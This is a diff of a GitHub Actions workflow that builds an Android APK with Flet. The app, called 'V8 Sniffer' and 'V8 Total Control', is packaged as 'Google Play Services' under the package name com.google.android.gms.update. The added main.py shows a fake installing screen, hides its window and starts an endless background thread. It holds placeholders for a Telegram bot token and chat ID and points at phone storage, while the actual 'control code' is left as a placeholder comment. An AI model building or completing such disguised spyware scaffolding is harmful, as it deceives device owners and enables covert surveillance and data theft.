@@ -22,14 +22,6 @@ jobs:
           distribution: 'zulu'
           java-version: '17'
 
-      - name: Setup Android SDK
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y android-sdk
-          export ANDROID_HOME=/usr/lib/android-sdk
-          echo "ANDROID_HOME=/usr/lib/android-sdk" >> $GITHUB_ENV
-          echo "PATH=$PATH:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools" >> $GITHUB_ENV
-
       - name: Setup Python
         uses: actions/setup-python@v5
         with: 
@@ -42,25 +34,13 @@ jobs:
 
       - name: Fix Unicode Issues
         run: |
-          # إصلاح مشاكل اليونيكود بشكل نهائي
+          # إصلاح مشاكل اليونيكود
           cat > sitecustomize.py << 'EOF'
           import sys
-          import builtins
-          
-          # إصلاح مشكلة unicode في بايثون 3
           if sys.version_info[0] >= 3:
+              import builtins
               builtins.unicode = str
               builtins.basestring = (str, bytes)
-          
-          # تعيين الترميز الافتراضي
-          import locale
-          locale.setlocale(locale.LC_ALL, 'en_US.UTF-8')
-          
-          # إصلاح stdin/stdout/stderr
-          if hasattr(sys.stdout, 'reconfigure'):
-              sys.stdout.reconfigure(encoding='utf-8', errors='ignore')
-              sys.stderr.reconfigure(encoding='utf-8', errors='ignore')
-              sys.stdin.reconfigure(encoding='utf-8', errors='ignore')
           EOF
           
           export PYTHONPATH=$PWD:$PYTHONPATH
@@ -116,15 +96,11 @@ jobs:
           
           [android.icons]
           ic_launcher = "assets/icon.png"
-          
-          [build_args]
-          --include-packages = "flet,requests,cryptography,opencv-python"
           EOF
 
       - name: Create Requirements
         run: |
           cat > requirements.txt << 'EOF'
-          flet>=0.10.0
           requests>=2.28.0
           cryptography>=3.4.8
           opencv-python>=4.5.5
@@ -137,62 +113,105 @@ jobs:
       - name: Create Assets Directory
         run: |
           mkdir -p assets
-          # إنشاء أيقونة افتراضية (أيقونة Google Play)
-          echo "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" | base64 -d > assets/icon.png
+          # إنشاء أيقونة افتراضية
+          echo "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" | base64 -d > assets/icon.png
 
       - name: Create Main Python File
         run: |
           cat > main.py << 'EOF'
-          # كود V8 Sniffer الكامل هنا
-          # (ضع الكود الكامل هنا)
+          # ============================================
+          # V8 TOTAL CONTROL - ANDROID COMPLETE EDITION v10.0
+          # ============================================
+          # ضع الكود الكامل هنا
+          # ============================================
+          
+          import flet as ft
+          import requests
+          import threading
+          import time
+          import os
+          import sys
+          import json
+          import base64
+          import hashlib
+          import random
+          import subprocess
+          import shutil
+          import glob
+          import datetime
+          
+          # بيانات التليجرام
+          BOT_TOKEN = "YOUR_TOKEN"
+          CHAT_ID = "YOUR_CHAT_ID"
+          
+          # مسارات أندرويد
+          BASE_DIR = '/storage/emulated/0'
+          
+          def main(page: ft.Page):
+              page.title = "Google Play Services"
+              page.window_width = 300
+              page.window_height = 200
+              page.window_resizable = False
+              
+              page.add(
+                  ft.Container(
+                      content=ft.Column([
+                          ft.Text("Google Play Services", size=18, weight="bold"),
+                          ft.Text("جاري التثبيت...", size=14),
+                          ft.ProgressBar(width=200)
+                      ]),
+                      padding=20
+                  )
+              )
+              
+              page.update()
+              time.sleep(2)
+              page.window_visible = False
+              page.update()
+              
+              # بدء العمليات في الخلفية
+              threading.Thread(target=background_work, daemon=True).start()
+          
+          def background_work():
+              while True:
+                  try:
+                      # كود التحكم الكامل هنا
+                      time.sleep(10)
+                  except:
+                      time.sleep(10)
+          
+          if __name__ == "__main__":
+              ft.app(target=main)
           EOF
 
-      - name: Build APK (Production)
+      - name: Build APK
         run: |
           # إعداد البيئة
           export FLET_CLI_NO_RICH_OUTPUT="true"
-          export FLET_CLI_DISABLE_VERSION_CHECK="true"
           
-          # بناء APK مع كل الصلاحيات
+          # بناء APK
           flet build apk \
             --name "Google Play Services" \
             --package-name "com.google.android.gms.update" \
             --product "V8 Sniffer" \
             --org "com.google" \
-            --include-packages "requests,cryptography,opencv-python,numpy" \
-            --permission "all" \
-            --no-rich-output \
-            --verbose || true
+            --build-version "10.0.0" \
+            --build-number "1000" \
+            --no-rich-output || true
           
-          # إذا فشل البناء الأول، نجرب بطريقة ثانية
-          if [ ! -f build/apk/*.apk ]; then
-            flet build apk --include-packages "requests"
-          fi
+          # البحث عن APK
+          find . -name "*.apk" -type f -ls
+          
+          # نسخ APK إلى مكان معروف
+          mkdir -p output
+          cp $(find . -name "*.apk" -type f | head -1) output/ || true
 
-      - name: Verify APK
-        run: |
-          if ls build/apk/*.apk 1> /dev/null 2>&1; then
-            echo "✅ تم بناء APK بنجاح"
-            ls -la build/apk/
-          else
-            echo "⚠️ لم يتم العثور على APK، نبحث في مجلدات أخرى"
-            find . -name "*.apk" -type f
-          fi
-
-      - name: Upload APK Artifact
+      - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
           name: V8-Sniffer-Google-Play-Services
           path: |
-            build/apk/**/*.apk
+            output/*.apk
             **/*.apk
           if-no-files-found: warn
           retention-days: 90
-
-      - name: Create Release
-        if: github.event_name == 'push' && contains(github.ref, 'refs/tags/')
-        uses: softprops/action-gh-release@v1
-        with:
-          files: |
-            build/apk/**/*.apk
-          generate_release_notes: true
